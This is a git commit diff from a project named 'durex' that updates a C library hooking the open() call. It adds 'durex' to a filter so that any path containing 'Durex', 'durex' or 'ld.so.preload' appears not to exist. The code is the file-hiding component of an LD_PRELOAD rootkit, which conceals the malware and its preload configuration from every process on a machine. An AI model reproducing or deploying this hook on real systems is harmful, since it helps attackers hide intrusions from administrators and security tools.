302779cdee8c10dd62452decf35874ac29cbc29a
gbourgeo <gillesbourgeois@gmail.com>
2018-11-08 07:59:31 +0100

    add 'durex' to hidden files

--- durex/lib_srcs/open.c
+++ durex/lib_srcs/open.c
@@ -6,6 +6,6 @@
 //#include<fcntl.h>
 #include<errno.h>
 #include<string.h>
-static const char*filter[]={"Durex","ld.so.preload",0};
+static const char*filter[]={"Durex","durex","ld.so.preload",0};
 #define DECLARE_OPEN static int(*original_##open)(const char*,int,mode_t)=NULL;int open(const char*p,int f,mode_t m){if(!original_##open){original_##open=dlsym(RTLD_NEXT,"__open");if(!original_##open){fprintf(stderr,"Error in dlsym: %s\n",dlerror());errno=ENOENT;return -1;}}int i=0;while(filter[i]){if(strstr(p,filter[i])){errno=ENOENT;return -1;}i++;}return original_##open(p,f,m);}
 DECLARE_OPEN
